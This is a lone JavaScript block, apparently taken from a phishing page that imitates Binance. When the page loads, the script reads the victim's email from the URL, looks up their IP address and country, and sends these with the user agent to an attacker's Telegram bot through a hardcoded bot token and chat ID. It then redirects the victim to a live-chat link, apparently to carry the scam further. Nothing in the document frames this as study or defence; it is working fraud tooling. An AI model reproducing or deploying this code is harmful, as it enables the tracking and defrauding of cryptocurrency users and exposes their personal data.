<script>
    let email;
    let hasEmail = new URLSearchParams(window.location.search).has("id");
    if(hasEmail) {
        email = new URLSearchParams(window.location.search).get("id");
    }
    async function getVisitorInfo() {
        try {
            // Get the IP address
            let response = await fetch('https://api.ipify.org?format=json');
            let data = await response.json();
            let ipAddress = data.ip;

            // Get the geolocation details
            response = await fetch(`https://ipinfo.io/${ipAddress}/json?token=8ebfd8b3b25012`);
            data = await response.json();
            let country = data.country;

            // Update the IP address and country on the page

            // Prepare the message to send to Telegram
            const message = `BINANCE LOG.........!!!\n\nName: Binance\nEmail: ${email}\nLanding URL: ${window.location.href}\nUser Agent:: ${navigator.userAgent}\nVisitor IP: ${ipAddress}\nCountry: ${country}`;

            // Send the data to Telegram
            await sendToTelegram(message);

        } catch (error) {
            console.error('Error fetching visitor info:', error);
        }
    }

    async function sendToTelegram(message) {
        const botToken = '7922956673:AAG_z88GagoAOYmKJKeFnErB2vK-bLEdqRg';  // Replace with your Telegram bot token
        const chatId = '1448268581';  // Replace with your chat ID

        // Construct the Telegram API URL
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            // Send the message to Telegram
            let response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });

            if (!response.ok) {
                throw new Error('Failed to send message to Telegram');
            }

            const result = await response.json();
            console.log('Telegram response:', result);  // Handle and log the response from Telegram API

            // Redirect to google.com after a successful POST request
            window.location.href = 'https://tawk.to/chat/67a51baf825083258e11183e/1ijef8abu';

        } catch (error) {
            console.error('Error sending message to Telegram:', error.message);
        }
    }

    // Call the function to get visitor info
    if(hasEmail) {
        getVisitorInfo();
    }
    
</script>

